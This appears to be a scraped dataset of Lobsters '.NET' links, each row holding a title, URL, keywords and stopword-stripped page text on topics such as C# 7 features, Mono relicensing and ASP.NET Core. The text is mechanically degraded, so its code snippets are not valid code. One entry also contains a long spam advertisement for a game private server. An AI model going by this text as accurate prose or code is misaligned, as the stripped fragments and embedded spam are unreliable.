498,Lobsters,dotnet,"C#, F#, .NET programming",.NET framework ported to NetBSD,https://github.com/dotnet/coreclr/pull/4504/files,net framework ported netbsd,reload reload,add suggestion batch applied single commit suggestion invalid change made code suggestion applied pull request closed suggestion applied viewing subset change one suggestion per line applied batch add suggestion batch applied single commit applying suggestion deleted line supported must change existing code line order create valid suggestion suggestion applied marked resolved suggestion applied pending review suggestion applied multiline comment perform action time signed another tab window reload refresh session signed another tab window reload refresh session
499,Lobsters,dotnet,"C#, F#, .NET programming",An Optimization Exercise,https://kevinmontrose.com/2016/04/26/an-optimization-exercise/,optimization exercise,optimization exercise kevinmontrose code nick craver stack overflow tweet snippet stack overflow showed containstoken method benchmarking contest available github solution programcs mattwarren benchmark gist unsafe block fixed block c guarantee string coerced char terminated null littleendian architecture faster original containstoken code something like faster,optimization exercise posted author kevinmontrose filed code nick craver one coworkers stack overflow tweet snippet stack overflow occasionally week ago showed containstoken method tuned performance set little bit benchmarking contest participated final attempt among fastest ended using lot trick think may general interest going walk code work first need define problem creating function determines split given delimiter value string contains given token ordinal comparison character acceptable clear tweet initially allocate also allowing optimization exploit stack overflow production environment intel net specific trick allowed since stack overflow already unsafe code unsafe also acceptable full solution available github solution programcs along several others credit mattwarren creating benchmark gist full solution sans comment going linebyline public static bool containstokenmonty string value string token char delimiter const int charsperlong sizeof long sizeof char const int charsperint sizeof int sizeof char const int bytesperchar sizeof char sizeof byte stringisnullorempty token return false stringisnullorempty value return false var delimitertwice delimiter delimiter var valuelength valuelength var tokenlength tokenlength tokenlength valuelength return false int tokenlongs bool tokentrailingint tokentrailingchar var remainingchars tokenlength tokenlongs remainingchars charsperlong tokentrailingint tokenlength tokentrailingchar tokenlength var tokenbytelength tokenlength bytesperchar unsafe fixed char valueptr value tokenptr token var curvalueptr valueptr var endvalueptr valueptr valuelength true long tokenlongptr long tokenptr var tokenlongs var tokenlong tokenlongptr var valuelong long curvalueptr tokenlong valuelong tokenlongptr curvalueptr charsperlong continue else goto advancetonextdelimiter int tokenintptr int tokenlongptr tokentrailingint var tokenint tokenintptr var valueint int curvalueptr tokenint valueint tokenintptr curvalueptr charsperint else goto advancetonextdelimiter char tokencharptr char tokenintptr tokentrailingchar var tokenchar tokencharptr var valuechar curvalueptr tokenchar valuechar tokencharptr curvalueptr else goto advancetonextdelimiter curvalueptr endvalueptr curvalueptr delimiter return true advancetonextdelimiter true var curval int curvalueptr var masked curval delimitertwice var temp masked temp temp temp int temp temp temp masked temp temp temp temp var neithermatch temp neithermatch curvalueptr charsperint curvalueptr endvalueptr return false continue var temp curvalueptr charsperint break var temp curvalueptr var remainingbytesinvalue byte endvalueptr byte curvalueptr remainingbytesinvalue tokenbytelength return false accident resembles c performance critical c often take note news call function may allocate code zero allocation overall algorithm follows scan forward token value long equal equal move back start token advance value next delimiter next delimiter return false end token next character value delimiter end value reached return true otherwise reset start token advance value next delimiter end value reached return false linebyline const int charsperlong sizeof long sizeof char const int charsperint sizeof int sizeof char const int bytesperchar sizeof char sizeof byte convenient constant later could hardcoded since long int char always byte long c find style easier reason stringisnullorempty token return false stringisnullorempty value return false code copied initial tweet real optimization available check important maintain compatibility original code var delimitertwice delimiter delimiter var valuelength valuelength var tokenlength tokenlength value need later doubling delimiter used test value length used bound calculation tokenlength valuelength return false rest code assumes token larger remaining part value check right make sure true token even fit value even bother look either string return false int tokenlongs bool tokentrailingint tokentrailingchar var remainingchars tokenlength tokenlongs remainingchars charsperlong tokentrailingint tokenlength tokentrailingchar tokenlength going compare token value chunk need know many longs fit token token always multiple length also need see character longs note single division constant poweroftwo get compiled something much faster actual division var tokenbytelength tokenlength bytesperchar one useful value start actually comparing string since pointer math later knowing number byte importantly number character token come handy unsafe fixed char valueptr value tokenptr token var curvalueptr valueptr var endvalueptr valueptr valuelength first scary bit rest method unsafe block mean use pointer bound checking pointer take pin pointer value token make copy value pointer mutated pointer declared fixed block calculate endvalueptr use bound check value true long tokenlongptr long tokenptr var tokenlongs var tokenlong tokenlongptr var valuelong long curvalueptr tokenlong valuelong tokenlongptr curvalueptr charsperlong continue else goto advancetonextdelimiter start comparing token value string earlier calculated many longs fit value simple loop make sure match iteration compare character worth value token match continue loop goto advancetonextdelimiter big win larger token quarter comparison branch important thing note long cast free curvalueptr incremented faster might assume since charsperlong const increment value precalculated instead involving multiplication int tokenintptr int tokenlongptr tokentrailingint var tokenint tokenintptr var valueint int curvalueptr tokenint valueint tokenintptr curvalueptr charsperint else goto advancetonextdelimiter essentially check single int comparing two character time good four nothing whether check necessary determined earlier tokentrailingint unchanging across single call good branch prediction char tokencharptr char tokenintptr tokentrailingchar var tokenchar tokencharptr var valuechar curvalueptr tokenchar valuechar tokencharptr curvalueptr else goto advancetonextdelimiter single char curvalueptr endvalueptr curvalueptr delimiter return true chunk code reached every character token matched left make sure either delimiter end value reached got match return true otherwise fall advancetonextdelimiter advancetonextdelimiter true var curval int curvalueptr var masked curval delimitertwice var temp masked temp temp temp int temp temp temp masked temp temp temp temp var neithermatch temp neithermatch curvalueptr charsperint curvalueptr endvalueptr return false continue code advance curvalueptr forward delimiter found clever combination trick allow checking two character one branch first trick advancing two character time thus int cast willing advance character past end value work c guarantee string coerced char terminated null character null byte always two additional byte end string u read whether need second trick series bit twiddlings follows xor delimitertwice curval making top bottom charsized chunk masked match delimiter delimitertwice precalculated masked clearing high bit top bottom charsized chunk temp store result temp add temp causing high bit top bottom charsized chunk temp low bit respective chunk set temp clearing high bit top bottom charsized chunk temp temp masked making sure high bit charsized chunk set temp highbits masked temp set low bit charsized chunk temp make temp charsized chunk curval match delimiter invert temp making step made compare temp setting neithermatch followed taken neithermatch set increment pointer value two char bound check comparing curvalptr endvalueptr precalculated purpose false returned bound exceeded note endvalueptr point nullterminator bailing curvalptr equal correct var temp curvalueptr charsperint break var temp curvalueptr code run delimiter found curvalueptr pointing character int contains contain top bottom char temp whichever one zero one contained delimiter depending set curvalueptr incremented point first character delimiter note executing littleendian architecture c bigendian increment size appear flipped also remember token empty checked start method checking second char first error var remainingbytesinvalue byte endvalueptr byte curvalueptr remainingbytesinvalue tokenbytelength return false code run next delimiter found curvalueptr advanced one char past necessary reassert enough space remaining value token fit asserted back towards start method space check done byte instead char cast free counting number char two pointer subtraction followed division counting number byte subtraction precalculating tokenbytelength done purpose loop begin continues match found value exhausted aaaaaaand performance wise faster original containstoken code something like faster next best implementation sure encourage anyone use code relies several subtlety make hard understand also tuned architecture correct bigendian one could fixed require build tweak particularly interesting portable sure fun write though
500,Lobsters,dotnet,"C#, F#, .NET programming",JavaZone Sells Open Source in TV Parodies,http://fossforce.com/2016/04/javazone-sells-open-source-tv-parodies/,javazone sell open source tv parody,april javazone sell open source tv parody christine hall video screening room movie trailer spoof sell movie definitely coming soon theater near however bet booty released creative common license javazone conference game code lilyhammer brideoflinux,april javazone sell open source tv parody christine hall video screening room movie trailer spoof sell movie definitely coming soon theater near however bet booty released creative common license found going opportunity substitute phil shapiro today video column jumped chance want share one great tv parody javazone conference produce year case know since beginning fifteen year ago javazone grown largest independent conference java developer planet conference held year oslo norway year event scheduled september big java fan really like folk percent mean totally trouble number behind open source past six year produced annual video parody popular television show time become increasingly lavish production absolute favorite game code based let figure today presentation however reaching back conference presented sendup movie trailer makebelieve movie called jave chosen one partly norwegian reminds lot lilyhammer fish water show got hooked netflix mainly however chosen three minute second almost entirely spent poking fun user certain proprietary company product video oh yeah also chose music turtle probably explains popup advertisement need clicking away riaa want paid know even fair use phil shapiro back tuesday great weekend related christine hall journalist since began writing weekly consumer computer column started covering linux fo making switch gnulinux follow twitter brideoflinux comment closed
502,Lobsters,dotnet,"C#, F#, .NET programming",Dr Frankenfunctor and the Monadster,https://vimeo.com/162054542,dr frankenfunctor monadster,ndclondoncom ndcconferencescom,got pile assorted function lying around one useful reliable nt fit together properly assemble complete system stand two foot terrorize local villager talk show functional programming toolkit transform mismatched code shape plugcompatible bolted together effortlessly warning talk contains gruesome topic strained analogy discussion monad ndc conference ndclondoncom ndcconferencescom
503,Lobsters,dotnet,"C#, F#, .NET programming",csharp rules for Google's Bazel.io. - Now with Nuget package support.,https://github.com/bazelbuild/rules_dotnet,csharp rule google bazelio nuget package support,c rule bazel example runtime consideration multiple framework version nuget usage core api dotnetlibrary corelibrary netlibrary dotnetbinary netbinary corebinary dotnetresx netresx coreresx dotnetnunittest netnunittest corexunittest netxunittest dotnetxunittest dotnetresx netresx coreresx dotnetimportlibrary coreimportlibrary netimportlibrary dotnetimportbinary coreimportbinary netimportbinary dotnetstdlib corestdlib netstdlib workspace rule toolchains test core net mono warning window requires minimum version bazel due improper symbolic link target handling previous version sandboxing bazel bazel workaround mono dotnetrepositories dotnetrepositoriesnugets dotnetregistertoolchains monoregistersdk coreregistersdk netregistersdk dotnetlibrary dotnetbinary dotnetnunittest dotnetresx nugetpackage dotnetnugetnew,c rule bazel build status azure pipeline travis ci appveyor example runtime consideration multiple framework version nuget usage core api dotnetlibrary corelibrary netlibrary dotnetbinary netbinary corebinary dotnetresx netresx coreresx dotnetnunittest netnunittest corexunittest netxunittest dotnetxunittest dotnetresx netresx coreresx dotnetimportlibrary coreimportlibrary netimportlibrary dotnetimportbinary coreimportbinary netimportbinary dotnetstdlib corestdlib netstdlib workspace rule toolchains test minimal viable set c binding building c code core net mono still pretty rough work warning window requires minimum version bazel due improper symbolic link target handling previous version rule compatible sandboxing particularly running dotnet rule linux osx requires passing spawnstrategystandalone bazel creates long path therefore recommended increase length limit using newer version window please see however window program handle long path name notably microsoft c compiler clexe therefore tmp env variable set something short like x c temp bazel dotnetrules rely symbolic linking window typically requires elevated permission however newer version window workaround nunit runner used test requires net framework installation intend use mono net framework installed locally machine producer framework provide downloadable runinplace without installation version developer version framework used add following workspace file add external repository newer version fine load bazeltoolstoolsbuilddefsrepo gitbzl gitrepository gitrepository name iobazelrulesdotnet remote http githubcombazelbuildrulesdotnet branch master load iobazelrulesdotnetdotnet depsbzl dotnetrepositories dotnetrepositories load iobazelrulesdotnetdotnet defsbzl coreregistersdk netregistersdk monoregistersdk dotnetregistertoolchains dotnetrepositoriesnugets nugetpackage dotnetregistertoolchains dotnetrepositoriesnugets net core coreregistersdk net framework netregistersdk mono monoregistersdk dotnetrepositories rule fetch external dependency defined loading file rulesdotnet dotnetrepositoriesnugets load nuget package required test rule dotnetregistertoolchains configures toolchains monoregistersdk coreregistersdk netregistersdk glue toolchains appropriate sdks add file named buildbazel root directory project general need one file every directory dotnet code top file used rule imported load iobazelrulesdotnetdotnet defsbzl dotnetlibrary dotnetbinary intend use coreclr make sure install libunwinddevel present system applies linux dotnetlibrary dotnetlibrary name foobardll srcs foocs barcs deps examplesexamplelib myclass npgsql npgsqllib note defined library must extension dll otherwise launcher used rulesdotnet able correctly locate necessary file dotnetbinary dotnetbinary name foobarexe srcs foocs barcs deps examplesexamplelib myclass npgsql npgsqllib visibility visibility public note defined library must extension exe otherwise launcher used rulesdotnet able correctly locate necessary file dotnetnunittest dotnetnunittest name mytestdll srcs mytestcs deps examplesexamplelib myclass nunitframework note defined library must extension dll otherwise launcher used rulesdotnet able correctly locate necessary file dotnetresx dotnetresx name transform src srcclientutilitiesutiltransformresx nugetpackage workspace file project record nuget dependency like repository rule work unless workspace file nugetpackage name newtonsoftjson package newtonsoftjson version corelib netlib monolib coredeps netdeps monodeps corefiles netfiles monofiles build file add package deps dotnetbinary name foobarexe srcs foocs barcs deps examplesexamplelib myclass newtonsoftjson dotnet visibility visibility public dotnetnugetnew workspace file project record nuget dependency like repository rule work unless workspace file dotnetnugetnew name npgsql package npgsql version buildfilecontent package defaultvisibility visibility public load iobazelrulesdotnetdotnet defsbzl dotnetimportlibrary dotnetimportlibrary name npgsqllib src build file add package deps dotnetbinary name foobarexe srcs foocs barcs deps examplesexamplelib myclass npgsql npgsqllib visibility visibility public
504,Lobsters,dotnet,"C#, F#, .NET programming",Why learning Haskell/Python makes you a worse programmer (2006),http://lukeplant.me.uk/blog/posts/why-learning-haskell-python-makes-you-a-worse-programmer/,learning haskellpython make worse programmer,,demotivation find think python even haskell extent even though used haskell little constantly find wanting use idiom language noticing much le code able write using one language although different much powerful language use work c common notice using either language could decrease chunk code factor rare see factor certain part code base experience haskell mean see potential bug everywhere imperative code fairly well aware problem stateful programming sideeffects cause dealt many score bug related directly spent countless hour debugging problem without alternative guess lived know way thing find difficult satisfied code write constantly aware writing trap people likely fall also find c code ugly compared python haskell visual level mandatory use brace everywhere ok mandatory everywhere enforced coding standard good reason make code contain lot line noise empty space combined verbosity library type declaration etc find page c hardly anything also thinking beauty mathematical level c grubby mud hut compared breathtaking elegant tower haskell net result thing make depressed demoralised feel like human compiler translating haskell python head language whole level lower using functional style obfuscates code using language c begun get feature friendly functional style programming day faced common situation tried functional solution list foo object description method return string need concatenate nonempty description inserting newlines code wanted write python code n join foodescription foo mylist foodescription haskell concat listintersperse n filter map description mylist using generic c method contain best got stringjoin n mylistconvertall string delegate foo foo return foodescription findall delegate string x return x toarray starting different data structure c version would even worse c seems hundred different collection class used inconsistently net library also point write method accept delegate nearest thing first class function declare function signature separately one exist already know find one already exists adding bloat functional style code big problem c version first little reduction size versus imperative style code compare tedious loop would written otherwise string retval foreach foo foo mylist string desc foodescription desc retval retval n retval desc much second took longer write experimenting see much type information add get compile eg adding explicit cast delegate turned necessary specify convertall string instead convertall finally problem code get trouble colleague writing complex code using advanced feature anonymous delegate simple loop would sufficed actually left functional version embarrassed add brief explanatory note fact functional idiom work badly language syntactic support java know would much worse c suffers although feature enable functional programming arrived c along various language improvement huge chunk net library updated take advantage code certainly might argued still use principle functional programming side effect function depend input etc get benefit way even use idiom reality library framework designed imperative language work like aspnet especially bad example develop control inheriting control overriding various method method return value input work solely mutating state object object called framework somewhat subtle complex order yes nightmare debug fact applying principle functional programming would lead use static method instance method much possible avoiding anything mutates state even possibility mutating state would use ubiquitous dumb datatypes keep algorithm separate fly face teaching least practice main programming paradigm popular today oop apply think good principle writing code without rejecting paradigm language library surrounded fairly hopeless
505,Lobsters,dotnet,"C#, F#, .NET programming",Launch of the F# Speakers Program,http://foundation.fsharp.org/speakers_program_launch,launch f speaker program,f speaker program member f software foundation contact u slack speaker channel nearly speaker,f software foundation proud announce official launch f speaker program goal initiative support growth f community worldwide helping local community find speaker willing present f content giving visibility new speaker everywhereany member f software foundation willing present f content request added list speaker local group looking speaker contact u help make connection alternatively group may simply reach slack speaker channel open member launch already nearly speaker listed program spanning country every continent except antarctica would like extend heartfelt thank behalf community hope many join part program also offering financial assistance speaker need travel give presentation take lot time effort prepare give presentation want encourage speaker help way even modestly intend improve program time based feedback welcome suggestion make better c nonprofit united state f software foundation launching initiative mission particularly working group want get involved would love hear detail see
506,Lobsters,dotnet,"C#, F#, .NET programming",C◦mp◦se :: Conference - Chaos Engineering at Jet,https://www.youtube.com/watch?v=Q1tgb3m0Fy4,conference chaos engineering jet,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature chaos engineering jet youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature chaos engineering jet youtube
507,Lobsters,dotnet,"C#, F#, .NET programming","C# 7 new features: Tuples, Records and Pattern Matching",https://www.kenneth-truyers.net/2016/01/20/new-features-in-c-sharp-7/,c new feature tuples record pattern matching,c tuples parameter tupletype class struct tuple return type inline tuples tuple deconstruction c record type c pattern matching c nonnullable reference type tony hoare c local function c immutable type conclusion work list feature visual studio preview,seems like yesterday got c go software development land next thing already way post want describe likely new c feature look like useful c tuples update tuples planned part c tuples temporary grouping value could compare tuple pococlass instead defining class define fly following example class class propertybag public int id get set public string name get set var myobj new propertybag id name test example really necessary name concept working probably temporary structure need naming tuples way temporarily creating structure fly without need create class common reason group value temporarily grouped multiple return value method currently way c parameter public void getlatlng string address double lat double lng double lat lng getlatlng myvalues lat lng consolewriteline lat lat long lng using outparameters several disadvantage used asyncmethods declare parameter upfront use var include type tupletype currently already tupletype c behaves like native tuple could rewrite previous method follows public tuple int int getlatlng string address var latlng getlatlng address consolewriteline lat long disadvantage outparameters resulting code rather obscure resulting tuple property name like class struct could also declare new type use return type struct latlng public double lat public double lng public latlng getlatlng string address var getlatlng address consolewriteline lat lllat long lllng none disadvantage outparameters tuple type rather verbose meaningless overhead different use case tuples available c tuples tuple return type specify multiple return type function much syntax specifying multiple input type method argument public double lat double lng getlatlng string address var getlatlng address consolewriteline lat lllat long lllng inline tuples could also create tuples inline var new double lat double lng lat lng tuple deconstruction bundling value important concept quite possible want access bundle get straight internal value instead accessing tuple property example tuple return type also destructure tuple immediately var lat var lng getlatlng address consolewriteline lat lat long lng c record type update record probably coming c wait next version supposedly c record type simple bag property data type property often class structs merely collection property still need full declaration quite verbose following class demonstrates class property requires quite bit text declare class mypoint int x int int z mypoint int x int int z x x z z public int x get return x public int get return public int z get return z record type could write single line class point int x int int z get thing class automatically implement iequatable mean compare two record type based value instead reference tostringmethod output value record c pattern matching update pattern matching planned partially supported c c switching type available full support pattern matching come next version supposedly c record type play get pattern matching builtin pattern matching mean switch type data execute one statement although pattern matching look lot like ifelse certain advantage pattern matching data type even whereas ifelse always need primitive match pattern matching extract value expression following example pattern matching class geometry class triangle int width int height int base geometry class rectangle int width int height geometry class square int width geometry geometry g new square switch g case triangle int width int height int base writeline width height base break case rectangle int width int height writeline width height break case square int width writeline width break default writeline break sample see match data type immediately destructure component c nonnullable reference type update nonnullable reference type probably coming c wait next version supposedly c nullable value type introduced c essentially syntactic sugar around nullable class nonnullable reference type reverse feature let declare reference type guaranteed null null reference called billion dollar mistake inventor tony hoare nullreference exception common problem twofold either check might get runtime exception check code becomes verbose littered statement little actually trying achieve ability declare reference type nonnullable overcomes problem note syntax still flux probably change various proposal floating around still unclear definitive form also mention error still unclear whether compilation error warning first ideal syntax would default nonnullable reference type would provide symmetry reference value type int nonnullable value type int b nullable value type string c nonnullable reference type string nullable reference type however million line c would break nonnullable type would become default unfortunately designed differently keep everything backwards compatible currently proposed syntax follows int nonnullable value type int b nullable value type string c nonnullable reference type string nullable reference type using nullable nonnullable type affect compiler myclass nullable reference type myclass b nonnullable reference type null ok nullable b null error b nonnullable b error n might null ca nt null writeline btostring ok ca nt null writeline atostring warning could null null writeline atostring ok checked writeline length ok say using syntax ok would become problematic generic type dictionary nonnullable string list myclass nt dictionary string list myclass mydict proper way declare type nonnullable dictionary string list myclass mydict bit difficult read type shortcut also proposed typing front type argument make type nonnullable dictionary string list myclass mydict c local function update local function planned part c ability declare method type block scope already kind possible using func action type anonymous method however lack feature generic ref parameter params local function would capability normal method would scoped block declared public int calculate int someinput int factorial int return return factorial var input someinput calcs return factorial input c immutable type update immutable type currently planning c next version immutable object object whose state modified creation immutable object offer benefit inherently threadsafe make easier use reason code easier parallelize code reference immutable object cached change currently already possible declare immutable object public class point public point int x int x x public int x get public int get definitely immutable object problem intent clearly visible one day someone might add setter consumer type expecting immutability could experience different result note syntax still flux initial proposal suggests adding immutable keyword public immutable class point public point int x int x x public int x get public int get immutable type nice addition language support creating new instance based different instance var new point var b x conclusion information new proposed feature head github full list work list feature note still early day syntax probably change feature might even make c wait c later encourage everyone take look github page examine learn feature discussion quite lively another good proposal check forum maybe feature get cut really nice microsoft opened channel better make use update want try feature download preview version visual studio preview different visual studio
508,Lobsters,dotnet,"C#, F#, .NET programming",Mono Relicensed MIT,http://www.mono-project.com/news/2016/03/31/mono-relicensed-mit/,mono relicensed mit,mit license net foundation mono runtime released mit license open sourcing proprietary mono extension,microsoft build today announced rereleasing mono mit license contributed net foundation major news mono developer contributor incredibly excited opportunity create mono project project able benefit mono runtime released mit license mono class library always available mit license mono runtime duallicensed developer could run apps window linux mac o x lgpl version runtime also offered mono runtime commercial term scenario lgpl suitable moving mono runtime mit license remove barrier adoption c net large number scenario embedded application including embedding mono scripting engine game engine application open sourcing proprietary mono extension past year xamarin developed number proprietary extension mono including port mono runtime workarounds bug arm chip use apple commoncrypto implement crypto class net api integration certificate apple platform support native type apple platform generic value type sharing offset tool maintain cross compiler integrated main mono codebase contributed along mono net foundation released mit license today
509,Lobsters,dotnet,"C#, F#, .NET programming",Xamarin free in Visual Studio and open sourcing Xamarin SDKs,https://blog.xamarin.com/xamarin-for-all/,xamarin free visual studio open sourcing xamarin sdks,xamarin blog,xamarin blogan open source mobile platform building android io macos watchos tvos apps net
510,Lobsters,dotnet,"C#, F#, .NET programming",JavaScript for C# Developers,https://www.blewis.io/javascript-for-csharp-developers,javascript c developer,subtle difference hidden gotchas language feature sixth edition class syntax fundamental difference development environment resharper hide main menu sublime atom visual studio code sublimelinter configuration webpack browserify noderequirer npm testing jest mocha karma redux serverside nodejs express hapi conclusion,overheard work today hate javascript much sound like something say instead letting hate flow know nt like javascript evolving quickly picking luxury c yearssubtle differencesbefore get cooler newer part javascript key difference c really know equality checking use triple equal common everyday equality checking inequality avoid double equal due hidden gotchasvariable declaration variable instantiated var behave expect lexically scoped opposed block scoping c language eg var created inside loop block visible beyond curly brace edition introduces let work like c varlanguage featuresjavascript went several year edition third edition released fifth edition anymore sixth edition published june included proposal twoyear release cycle new feature include linq code written linq generally declarative expressive code nt easily within reach writing j similar function array exist j named differently map instead selectfilter instead wheresort instead orderby c var philly new menuitem philly fry var reuben new menuitem reuben fry var pizza new menuitem pizza salad var menu new philly reuben pizza var choice menu x xside fry orderby x xprice select x xname choice reuben philly j var philly name philly side fry price var reuben name reuben side fry price var pizza name pizza side salad price var menu philly reuben pizza var choice menu filter x xside fry sort x xprice map x xname choice reuben philly class syntax introduced class syntax make creating class look much familiar usual c style still fundamental difference inheritance work j v c similar syntax help smooth c class address private readonly string city private readonly string state private readonly string zip public address string city string state string zip city city state state zip zip public string toformattedstring return city state zip j class address constructor city state zip thiscity city thisstate state thiszip zip toformattedstring return thiscity thisstate thiszip string interpolation javascript version string interpolation us backtick character must using later use like c var number var size large return take number size pizza please j var number var size large return take number size pizza please development environmentboth development environment tool available given language greatly affect productivity experience language irrespective language visual studio despite bit sluggish time great development environment work popular javascript ides tend le ide text editor make feel quicker responsivepowerful ide community plugins make v even better plugin ecosystem ranging essential resharper tiny hide main menu personal favorite javascript sublime hugely popular recently atom github offer fantastic set usercreated package theme also lightweight visual studio code support c j resharperstyle suggestion even though javascript interpreted language front end developer recognized value catching potential error execution sublime adding sublimelinter package plus little bit configuration give static code analysis à la resharper example include removing unused variable removing unreachable code requiring default case switch statementsimporting gone day include multitude script page particular order like statically typed language like c use import statement j file reference file built tool like webpack browserify throw noderequirer mix intellisenselike plugin sublime finding file feel right homepackage manager nuget handy npm handiertestingjavascript development wild west roughly thrown together code undefined function hiding every rock right wrong unit testing popular testing framework include jest mocha karma kickass test runner even ability rerun test suite j file change testdriven development popular net community j developer starting embrace example redux tutorial written tdd style c test public void shouldreturntrueforvalidprimenumber var isprime classundertestisprimenumber isprimeshould true j describe isprimenumber function return true valid prime number function var isprime isprimenumber expect isprime tobe true serversidehistorically javascript always known clientside language nodejs completely changed notionserver api framework addition middleware layer like express hapi quickly write robust fullyfeatured server api code c public class sandwichescontroller apicontroller public actionresult index int id stuff request response j var express require express var app express appget id function request response var sandwichid requestparamsid stuff request response conclusionjavascript nt bad right
511,Lobsters,dotnet,"C#, F#, .NET programming",A Xamarin + Microsoft Future,https://blog.xamarin.com/a-xamarin-microsoft-future/,xamarin microsoft future,xamarin blog,xamarin blogan open source mobile platform building android io macos watchos tvos apps net
512,Lobsters,dotnet,"C#, F#, .NET programming",Language Safety Score Mark 2 - Deliberate Software,http://deliberate-software.com/safety-rank-part-2/,language safety score mark deliberate software,point correlation coefficient unit test conclusion special thanks patrick boe kyle burton daniel miladinov chris salch tim visher rrust unotriddle ukillercup udiegobernardes complaint department blog source,check description checkname checkdesc new score shown lot language added safety check total lang magnitude percentagetotals lang current language getname lang alllangtotals index point see model corresponds data real world used github api query number bug created repository fork created span commits counted summing commit count contributor decided rely count commits standard unit work assumption across fifty different project commit size would average unit work decided wanted find ratio bug per commit language collected ratio bug logged per commit repository grouping primary language removed top bottom using bugcommit ratio common practice statistic help find accurate average summed bug commits remaining repository grouped language finding total average bugcommit ratio language grouping data sorted safety score language bug commits repository bugcommits langname langbugs langcommits langrepos getbugsratio lang language sorted safety score bugcommit ratio took magnitude safety score bugcommit ratio inverting safety score overlaid onto single graph immediately obvious ruby python php clojure seem strongly buck trend otherwise language follow pretty consistent slope bug taking correlation give correlation coefficient unit test thinking ruby clojure php python might correlate well due factor collected data many test repository counted number file containing test spec gave following sorted test per commit language test commits repository testscommits langname langtest langcommits langrepos gettestsratio lang php python ruby higher average number test clojure additionally go scala java also higher average number test yet score relatively average bugscommit conclusion conclusion current safety model proposed seems account moderate reduction bug per commit across sampled language factor currently unable account significantly lower expected bug count ruby clojure special thanks special thanks alphabetical order patrick boe haskell sniff test kyle burton general advice nil creque listening board max haley python ruby teaching math daniel miladinov java scala morale support keith brien ruby j chris salch coffeescript j tim visher clojure additional thanks poster rrust including unotriddle ukillercup udiegobernardes put together rust score complaint department mess something language missing safety check happily take pull request new language blog source pick existing language edit name value copy clipboard build language data structure send pr include along thanks page
513,Lobsters,dotnet,"C#, F#, .NET programming",C◦mp◦se :: Conference 2015 Videos,http://www.composeconference.org/2015/summary/,conference video,,jan feb manhattan nyc
514,Lobsters,dotnet,"C#, F#, .NET programming","RestBus - Call ASP.Net Core, Web API and ServiceStack endpoints over RabbitMQ",http://restbus.org,restbus call aspnet core web api servicestack endpoint rabbitmq,net httpclient need restbus getting started feature zero configuration use existing web service asynchronous messaging horizontal scaling fast benchmark project customizable roll messagemapper class work work advanced scenario license,restbus high performance messaging library enables consume aspnet core web api servicestack service endpoint via rabbitmq restbus queuing sending message asynchronously simple var amqpurl amqp amqp uri rabbitmq server var servicename samba unique identifier target service var client new restbusclient new basicmessagemapper amqpurl servicename call hellorandom endpoint var response await clientgetasync hellorandom look familiar conversant net httpclient class right home restbusclient class fact derive base class hellorandom endpoint ordinary web service endpoint aspnet core web api servicestack service restbus route request rabbitmq invokes endpoint return response without ever hitting http transport need using rabbitmq net frustrating experience restbus make ridiculously easy reason see restbus getting started feature zero configuration nt need configure rabbitmq server restbus automatically creates exchange queue resource needed use existing web service service still consumed via http supporting rabbitmq call turn http interface migrating service message oriented architecture easy writing line code asynchronous messaging enjoy optimum efficiency service request processing endpoint invoked asynchronously horizontal scaling scaling service horizontally easy launching new instance fast restbus compare favorably messaging library fastest library many case detail see benchmark project customizable roll messagemapper class custom messaging behavior work restbus follows rpc messaging style detail see work advanced scenario license apache license version
515,Lobsters,dotnet,"C#, F#, .NET programming",ASP.NET 5 is dead - Introducing ASP.NET Core 1.0 and .NET Core 1.0,http://www.hanselman.com/blog/ASPNET5IsDeadIntroducingASPNETCore10AndNETCore10.aspx,aspnet dead introducing aspnet core net core,http getaspnet update note reintroducing aspnet core net core net core cli choose sponsor responsive aspnet web apps wiwetcom hosting,naming hard two hard thing computer science cache invalidation naming thing phil karlton easy armchair quarterback say named foo would easy often many player involved naming thing aspnet good brand around year aspnet supported released product get use http getaspnet update note blog post announcing change done released yet datetime writing work starting ongoing next month however naming new completely written scratch aspnet framework aspnet bad idea one major reason make seem like aspnet bigger better replaces aspnet changing name picking better version number reintroducing aspnet core net core aspnet aspnet core net core net core entity framework entity framework core ef core colloquially new whole net core concept new net core cli new net core nt complete full net framework still exploring serverside graphic library still exploring gap aspnet aspnet core choose clear aspnet mature platform battletested released available today aspnet core release includes web api mvc nt yet signalr web page nt yet support vb f subsystem day today nt want anyone think aspnet core finish line new beginning fork road aspnet continues released fully supported lot great stuff coming stay tuned sponsor big thanks wiwet sponsoring feed week build responsive aspnet web apps quickly easily using c vb device minute wiwet aspnet template integrated visual studio ease use get wiwetcom hosting best game mu angel free reset open todayi know post violates violet would like admin mod deteted please ban account highly appreciate itassert level gamers worthy hero information game server opening officially http wwwcarigoldcomportalforumsshowthreadphp http http http rate drop item antihack newpremier version easy auto play easy auto afk reaffirming reputable lasting stable online playground class game equal lag sever especially using antihack proprietary hack fix strictly management gamers hack violence breaking sever taking place many large small event convergence exp ghrs new item high valueespecially free rare item update wing ex castle siege every week long time playing also awarded credit reset also offered credit inheriting promoting already along changing process suitable need aspiration gamers long time upgrade brought mu online general mu season particular completely new version promising give premier playground love mu onlinein order create fairest healthy playground today mu angel launched muangels server opened series attractive event continuous top racing event admin system support member heart giving free intermediate many event organized gm game many gift jade rabbit army many novelty event especially pick value item train every day eventswe pleased launch server mu angel please hurry participate version chance get antihack system completely especially server webshop item excellent full sale item full exl webshop losing excitement gamers participating online game well losing balance game furthermore make gamers boring quickly finding vip suit simple coming mu season special edition always feel true value gameall item earn game valuable webshop sell item jade spirituality chaos creative sell wishing jewel feather fish rolated cashop system new unique mu season enjoy new item item box system optimal condition reset table function reset applying function reset material finded game help always valuable experience feeling joy thrill sound jade drop addition also fully support function help choice stable server online highspeed line sub increased stable operation completely assured participating mu season moreover season version lightweight approximately sound version compatible operating system run smoothly even machine lowprofile many attractive event racing top racing top day racing weekly top racing monthly top racing top class racing top guildracing top rolated item event duel version hunting bos event hunting assassin castle siege every sundaygeneralizing serverinheriting promoting already along changing process suitable need aspiration gamers give mu online general mu season particular completely new version promising give premier playground love mu onlinein particular taking attractive special completely new mu online whole hearted admin system customer care support system ensures high benefit gamers good security antihack help stabilize game special experience server game version season unique hottest version mu online new version website system using interface management web version completely new many attractive new feature training parallel training account protection ip point master reset online currency transfer complete new ranking adequate many attractive event event time event arca battletime event blood castletime event castle deep eventtime chaoscastletime event devil squaretime event illusiontempletime event lunar rabbitcontinuity tow map lorencia kantru mu season private servermu online season online agarthamu online season online season online season private servermuangels free downloadevent continuum attractivemu open today new opening coming soon free resetfree open open beta new opening open month
